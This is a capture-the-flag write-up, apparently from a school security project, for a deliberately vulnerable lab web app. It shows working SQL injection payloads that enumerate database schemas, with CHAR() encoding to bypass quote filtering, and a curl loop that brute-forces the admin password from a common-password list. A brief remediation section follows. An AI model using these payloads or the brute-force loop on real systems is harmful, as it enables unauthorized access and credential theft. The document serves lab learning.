# Brute Force

On [the member search page](http://192.168.56.101/?page=member) querying list of Databases name from Information Schema shows that the schema named **Member_Brute_Force** exists.

```sql
1 AND 1=1 UNION SELECT 1, table_schema FROM information_schema.tables
```
![Member_Brute_Force DB](https://user-images.githubusercontent.com/22397481/207932328-93288cf9-01dc-4155-8ae7-b2670c054f07.jpeg)

Knowing the name of the DB to use, *Member_Brute_Force*, next step is to determine table name.

The `WHERE` clause requires single quotes around text values but the request will resulnt in an error from the PHP.
```sql
1 and 1=1 UNION SELECT table_name, 2 FROM information_schema.tables WHERE table_schema='Member_Brute_Force'
```

To bypass that, `CHAR()` function can be used. First, the string needs to be converted to a set of ASCII values using Python.
```python
┌──$ [~/42/2022/darkly]
└─>  python -c 'print([ord(c) for c in "Member_Brute_Force"])' 
[77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101]
```
Hence, SQL request will be following
```sql
1 AND 1=1 UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101)
```

by doing so, we can find `db_default` table in `Member_Brute_Force` schema:

![tables_name](https://user-images.githubusercontent.com/22397481/209446179-4a319599-97ed-4e72-a4ff-194843824efe.jpeg)

In order to take a look at the `db_default` table in `Member_Brute_Force` schema, following query needs to be executed, but as the php causes an error, it needs to be changed as well
```python
┌──$ [~/42/2022/darkly]
└─>  python -c 'print([ord(c) for c in "db_default"])'
[100, 98, 95, 100, 101, 102, 97, 117, 108, 116]
```
```sql
1 and 1=1 union select column_name, 2 from information_schema.columns where table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101) and table_name=CHAR(100, 98, 95, 100, 101, 102, 97, 117, 108, 116)
```

By doing so, we can acknowledge there are four columns `id`, `username`, `password`

![table_names](https://user-images.githubusercontent.com/22397481/209446331-122b5aa4-93d1-4616-93ca-9762fa951436.jpeg)

To check username in the `db_default` table, this query needs to be run

```sql
1 AND 1=1 UNION SELECT username,2 FROM Member_Brute_Force.db_default
```

Once we run the query, we know there are two users `admin`, and `root` exists for login.


Of course the password can be retrieved with sending a query to the `Member_Brute_Force` table, we can also try using the Brute Force Method.

In order to do so, the following script can be run, with password in [here](./2020-200_most_used_passwords.txt), [2020-200-most_used_passwords.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/2020-200_most_used_passwords.txt) from [SecLists](https://github.com/danielmiessler/SecLists)


```sh
┌──$ [~/42/2022/darkly]
└─>  while read PASSWORD; do curl -sL "http://192.168.56.101/?page=signin&username=admin&password=${PASSWORD}&Login=Login" | grep -oE "The flag is : [[:alnum:]]{64}" && echo "admin:${PASSWORD}"; done < 2020-200_most_used_passwords.txt
The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
admin:shadow
```

Log in with ID `admin` and password `shadow`.

![login admin shadow](https://user-images.githubusercontent.com/22397481/209446901-261e2a7a-9ea5-429d-a820-e4dbba6f07b7.gif)

## Remediation
SQL Injection has become a common issue with database-driven web sites.
- Validate user input
- Separate sensitive data and store it in different DB
- Utilize the principle of least privilege

***
https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
https://learn.microsoft.com/en-us/sql/relational-databases/security/sql-injection
